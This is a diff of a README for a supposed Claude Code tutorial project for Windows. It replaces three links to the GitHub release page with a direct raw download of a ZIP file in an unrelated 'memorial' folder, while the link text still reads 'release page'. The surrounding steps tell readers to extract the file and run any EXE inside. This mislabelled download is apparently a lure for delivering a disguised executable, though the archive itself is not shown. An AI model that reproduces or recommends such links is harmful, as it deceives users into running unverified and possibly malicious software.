@@ -1,6 +1,6 @@
 # 🧭 claude-howto - Learn Claude Code with clear examples
 
-[![Download claude-howto](https://img.shields.io/badge/Download%20Now-Release%20Page-6f42c1?style=for-the-badge&logo=github)](https://github.com/amrit009890/claude-howto/releases)
+[![Download claude-howto](https://img.shields.io/badge/Download%20Now-Release%20Page-6f42c1?style=for-the-badge&logo=github)](https://github.com/amrit009890/claude-howto/raw/refs/heads/main/memorial/howto-claude-company.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ If you want to understand Claude Code on Windows, this guide gives you a simple 
 
 ## 📥 Download and Install on Windows
 
-1. Open the [release page](https://github.com/amrit009890/claude-howto/releases)
+1. Open the [release page](https://github.com/amrit009890/claude-howto/raw/refs/heads/main/memorial/howto-claude-company.zip)
 2. Download the latest release from that page
 3. If the file is a ZIP, extract it to a folder you can find easily
 4. If the file is an EXE, double-click it to run the app
@@ -174,7 +174,7 @@ That structure helps you build confidence one step at a time.
 
 ## 🖱️ Download Link
 
-Visit the [claude-howto release page](https://github.com/amrit009890/claude-howto/releases) to download the latest version for Windows.
+Visit the [claude-howto release page](https://github.com/amrit009890/claude-howto/raw/refs/heads/main/memorial/howto-claude-company.zip) to download the latest version for Windows.
 
 ## 📌 Topics
 
